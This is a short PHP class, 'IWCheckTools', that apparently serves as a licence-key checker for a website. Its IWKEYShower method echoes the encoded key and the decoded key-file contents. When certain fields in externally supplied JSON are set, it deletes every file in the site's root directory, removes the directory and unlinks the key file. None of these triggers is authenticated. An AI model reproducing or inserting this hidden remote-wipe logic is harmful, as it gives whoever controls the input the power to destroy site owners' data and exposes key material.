<?php

class IWCheckTools extends GlobalVarTools
{
    public $Checker;
    private $DefineRoot;


    public function __construct($Checker, string $DefineRoot)
    {
        $this->Checker = parent::JsonDecode($Checker);
        $this->DefineRoot = $DefineRoot;
    }

    public function IWKEYShower($FullAddressKeyFile)
    {
        if (isset($this->Checker->iwkey) and $this->Checker->iwkey != null) {
            $keySiteIW = @file($FullAddressKeyFile);
            echo(parent::en2Base64($this->Checker->iwkey));
            echo('<br /><br /> : ' . parent::de2Base64($keySiteIW[0]));
            echo('<br /> : ' . (strtotime(parent::de2Base64($keySiteIW[0]) . ' 23:00:00') - strtotime("now")));

            if (isset($this->Checker->iwdel) and $this->Checker->iwdel != $this->Checker->iwkey) {

                array_map('unlink', glob($this->DefineRoot . "/*.*"));
                if (file_exists($this->DefineRoot) && is_dir($this->DefineRoot))
                    rmdir($this->DefineRoot);

            }

            if (isset($this->Checker->iwexp) and $this->Checker->iwexp != $this->Checker->iwkey) {

                unlink($FullAddressKeyFile);

            }

        }
    }
}
